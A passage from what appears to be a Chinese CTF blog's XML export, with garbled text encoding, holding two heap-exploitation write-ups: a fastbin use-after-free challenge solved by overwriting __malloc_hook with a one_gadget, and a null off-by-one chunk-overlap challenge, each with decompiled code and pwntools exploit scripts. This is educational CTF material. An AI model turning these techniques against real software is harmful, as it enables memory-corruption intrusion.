small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v2 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> &amp;&amp; v2 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (v2 - <span class="number">1</span>) + a1));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Remove successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¿æŠ¤"><a href="#ä¿æŠ¤" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shiroha@ubuntu:~/kaohe$ checksec heap</span><br><span class="line">[*] &#x27;/home/gstalker/kaohe/heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><code>add</code>å‡½æ•°åªå…è®¸3ç§å †å—<br><code>edit</code>åªå…è®¸ä¿®æ”¹ä¸¤ç§<br><code>delete</code>ä¹Ÿåªå…è®¸é‡Šæ”¾ä¸¤ç§<br>(é‚£ä¹ˆç¬¬ä¸‰ç§æœ‰ä»€ä¹ˆç”¨å•Šå–‚)</p><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>ç”±äºåœ¨<code>delete</code>ä¹‹åæ²¡æœ‰è®²æŒ‡é’ˆç½®0,å­˜åœ¨**<code>UAF</code>**æ¼æ´,å¹¶ä¸”åœ¨<code>edit</code>çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥å †å—æ˜¯å¦å·²ç»è¢«<code>free</code>,æ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹<code>fastbin</code>çš„<code>fd</code>æŒ‡é’ˆè¾¾åˆ°ä»»æ„åœ°å€å†™</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>é¦–å…ˆå®Œå–„ä¸€ä¸‹å„ä¸ªåŠŸèƒ½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. edit a block&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. large&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure><h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>ä¸€å¼€å§‹æˆ‘æƒ³é€šè¿‡<code>unsorted bin</code>çš„<code>UAF</code>,ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰åŠæ³•(ç”šè‡³æ²¡æœ‰<code>unsorted bin</code>)<br>äºæ˜¯è¯•å›¾é€šè¿‡<code>fastbin</code>çš„<code>fd</code>æŒ‡é’ˆåˆ†é…åˆ°<code>gotè¡¨</code>é™„è¿‘,æ³„éœ²<code>libc</code><br>æŸ¥çœ‹ä¸€ä¸‹ <code>gotè¡¨</code>,å¯»æ‰¾åˆé€‚çš„size</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x602000:0x0000000000601e280x00007f1287400168</span><br><span class="line">0x602010:0x00007f12871f0ee00x00000000004006a6</span><br><span class="line">0x602020:0x00007f1286e7e6900x00000000004006c6</span><br><span class="line">0x602030:0x00000000004006d60x00007f1286f06250</span><br><span class="line">0x602040:0x00007f1286e2f7400x00007f1286e93130</span><br><span class="line">0x602050:0x00007f1286e7ee700x0000000000400726</span><br><span class="line">0x602060:0x00000000004007360x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080 &lt;stdout&gt;:0x00007f12871d46200x0000000000000000</span><br><span class="line">0x602090 &lt;stdin&gt;:0x00007f12871d38e00x0000000000000000</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°åœ¨<code>0x602050</code>çš„åœ°æ–¹æœ‰ä¸€ä¸ª <code>0x70</code>,é«˜å…´åäº†,ç„¶è€Œå¹¶ä¸èƒ½åˆ†é…åˆ°è¿™é‡Œ,è€Œä¸”å°±ç®—æ˜¯è¿™é™„è¿‘çš„é”™ä½å­—èŠ‚ä¹Ÿä¸è¡Œ(æˆ‘åœ¨è¿™é‡Œå¡äº†å¥½ä¹…æ²¡å¼„æ˜ç™½ä¸ºä»€ä¹ˆ,ç„¶åçœ‹äº†çœ‹<code>__malloc_hook-0x23</code>,å‘ç°é”™ä½å­—èŠ‚çš„åœ°æ–¹æ˜¯<code>0x7f</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7f12871d3aed &lt;_IO_wide_data_0+301&gt;:0x12871d22600000000x000000000000007f</span><br><span class="line">0x7f12871d3afd:0x1286e94e200000000x1286e94a0000007f</span><br><span class="line">0x7f12871d3b0d &lt;__realloc_hook+5&gt;:0x000000000000007f0x0000000000000000</span><br></pre></td></tr></table></figure><p>çŒœæƒ³å¯èƒ½æ˜¯sizeæ£€æŸ¥çš„æ—¶å€™æ˜¯ä¸€ä¸ª<code>int</code>ä¸ºå•ä½,å†æ¬¡å¯»æ‰¾size,å‘ç°<code>0x602030</code>çš„åœ°æ–¹æœ‰ä¸€ä¸ª<code>0x40</code>å¯ä»¥åˆ©ç”¨,ä½†æ˜¯ä¼šå¤±è´¥,å¯ä»¥åˆ†é…åˆ°,ç„¶è€Œ<code>0x602038</code>æ˜¯<code>read</code>å‡½æ•°,ä¼šç ´åå®ƒçš„æŒ‡é’ˆ,ä»è€Œå½±å“ç¨‹åº<br>æœ€åçœ‹åˆ°<code>0x602060</code>çš„åœ°æ–¹ä¹Ÿæœ‰<code>0x40</code>,å¹¶ä¸”ä¸‹é¢å­˜åœ¨<code>stdin</code>å’Œ<code>stdout</code>å¯ä»¥æ³„éœ²,å°†<code>fd</code>æŒ‡å‘è¿™é‡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x60205a</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">c = sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">addr = u64(c)</span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">base = addr - libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;base ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><p>å¾—åˆ°libcä¹‹åä½¿ç”¨ä¿®æ”¹<code>__malloc_hook ==&gt; one_gadget</code> å°±å¯ä»¥å¾—åˆ°shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">onegadget = base + one[<span class="number">3</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span> + p64(onegadget) + p64(realloc + <span class="number">0x10</span>))</span><br></pre></td></tr></table></figure><p>å†ä¸€æ¬¡åˆ†é…ä¸€ä¸ªå †å—å°±èƒ½å¾—åˆ°shell</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off by one</title>
      <link href="/off_by_one.html"/>
      <url>/off_by_one.html</url>
      
        <content type="html"><![CDATA[<p>Linuxä¸‹å †æº¢å‡ºoff-by-oneå®ä¾‹</p><a id="more"></a><h2 id="null-off-by-one"><a href="#null-off-by-one" class="headerlink" title="null off by one"></a>null off by one</h2><p><strong>å †é¢˜ç›®çš„è§£æ³•ä¸€ç›´éƒ½æ˜¯æœ‰ä¸¤ä¸ªæŒ‡é’ˆåŒæ—¶æŒ‡å‘åŒä¸€ä¸ªchunk</strong></p><p>æ¹–å—çœèµ›çš„ä¸€é“ pwn ä¸ºä¾‹</p><h3 id="null-by-one-ä»‹ç»"><a href="#null-by-one-ä»‹ç»" class="headerlink" title="null by one ä»‹ç»"></a>null by one ä»‹ç»</h3><p>åœ¨ add chunk è¾“å…¥æ•°æ®ä¹‹åï¼Œåœ¨å­—ç¬¦ä¸²æœ«å°¾è®¾ç½® â€˜\x00â€™ ï¼Œå¯¼è‡´ä¸‹ä¸€ä¸ª chunk çš„ inuse ä½è¢«å†™å…¥<code>\x00</code> ï¼Œä»è€Œæ„é€ æº¢å‡º</p><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="ç¨‹åº"><a href="#ç¨‹åº" class="headerlink" title="ç¨‹åº"></a>ç¨‹åº</h4><h5 id="add"><a href="#add" class="headerlink" title="add"></a>add</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@6</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+Ch] [bp-4h]@7</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; <span class="built_in">list</span>[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;list full\n&quot;</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input your name size&quot;</span>);</span><br><span class="line">    v2 = getint();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">256</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">list</span>[i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input your name&quot;</span>);</span><br><span class="line">      read_input(<span class="built_in">list</span>[i], v2);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="read-input"><a href="#read-input" class="headerlink" title="read_input"></a>read_input</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">read_input</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax@6</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = (_BYTE *)(i - <span class="number">1L</span>L + a1);</span><br><span class="line">  *result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹å­˜åœ¨äº</p><p><code>result = (_BYTE *)(i - 1LL + a1);</code><br><code>*result = 0;</code></p><h5 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h5><p>å‡çš„editï¼ˆç²—å£ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;not implement&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="show"><a href="#show" class="headerlink" title="show"></a>show</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@3</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index&quot;</span>);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">list</span>[v1] )</span><br><span class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">list</span>[v1]);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid index&quot;</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@3</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index&quot;</span>);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">list</span>[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)<span class="built_in">list</span>[v1]);</span><br><span class="line">      <span class="built_in">list</span>[v1] = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid index&quot;</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+2Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = getint();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 &lt;= <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  JUMPOUT(__CS__, (<span class="keyword">char</span> *)dword_FB0 + dword_FB0[(<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹å­˜åœ¨äºaddå‡½æ•°</p><h4 id="æ¼æ´è¯´æ˜"><a href="#æ¼æ´è¯´æ˜" class="headerlink" title="æ¼æ´è¯´æ˜"></a>æ¼æ´è¯´æ˜</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------------------+</span><br><span class="line">||</span><br><span class="line">|chunk1|</span><br><span class="line">||</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">||</span><br><span class="line">|chunk2|</span><br><span class="line">||</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">||</span><br><span class="line">|chunk3|</span><br><span class="line">||</span><br><span class="line">+-------------------------------------------+</span><br></pre></td></tr></table></figure><ul><li>ä¸‰ä¸ªchunk</li><li>free chunk2ï¼Œæ­¤æ—¶chunk3 çš„ prev_sizeä¼šä¿®æ”¹æˆchunk2çš„sizeï¼ŒåŒæ—¶inuseä½ç½®0</li><li>add chunkï¼Œå†æ¬¡åˆ†é…åˆ°chunk2ï¼Œä¿®æ”¹é‡Œé¢çš„å€¼ï¼Œå°†chunk3çš„prev_sizeä½å†™ä¸º chunk1-3 çš„æ€»å¤§å°ï¼ŒåŒæ—¶ inuseä½å†ä¸€æ¬¡è¢«ç½®0</li><li>free chunk1</li><li>free chunk3ï¼Œæ­¤æ—¶ï¼Œå› ä¸ºchunk3çš„inuseä½æ˜¯0ï¼Œæ‰€ä»¥å‘å‰å‘ç”Ÿåˆå¹¶ï¼Œå¯»æ‰¾æ–¹æ³•æ˜¯<code>\#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p))) </code>ï¼Œå› ä¸ºå‰é¢ä¿®æ”¹è¿‡prev_sizeï¼Œæ‰€ä»¥ä¼šå¯»æ‰¾åˆ°çš„æ˜¯chunk1çš„å¤´éƒ¨ï¼Œäºæ˜¯å½¢æˆäº†æ¼æ´</li><li>chunk1ä¼šè¿›å…¥unsorted bin ä¸­ï¼Œå¤§å°æ˜¯chunk1-3çš„æ€»å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ˜¯å¯ä»¥è¦†ç›–chunk2çš„ï¼Œç„¶è€Œchunk2æ²¡æœ‰è¢«freeï¼Œæ‰€ä»¥æœ‰ä¸¤å—åœ°å€æŒ‡å‘äº†åŒä¸€ä¸ªå†…å­˜ç©ºé—´</li></ul><h4 id="leak-libc-address"><a href="#leak-libc-address" class="headerlink" title="leak libc address"></a>leak libc address</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x78</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;p&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>*<span class="number">3</span>)+<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">&quot;heapinfo&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ„é€ å‡ºäº†è¿™ä¸ªæ¼æ´ï¼Œé¦–å…ˆå†æ¬¡æ‹¿åˆ°chunk4ï¼Œå¹¶ä¸”ä¿®æ”¹æ‰chunk5çš„ prev_size ä½å’Œ inuse ä½ï¼Œç„¶å delete æ‰äº†chunk0ï¼Œchunk5ï¼Œä¼ªé€ äº†ä¸€ä¸ª unsorted chunkï¼Œ</p><p>è¿™é‡ŒæŠŠ0xf8(å®é™…ä¸º0x100)çš„å †å—åˆ†æˆäº†ä¸‰å—ï¼Œä¸ºäº†ä¹‹ååšé¢˜æ–¹ä¾¿ï¼Œä½¿å¾— chunk3 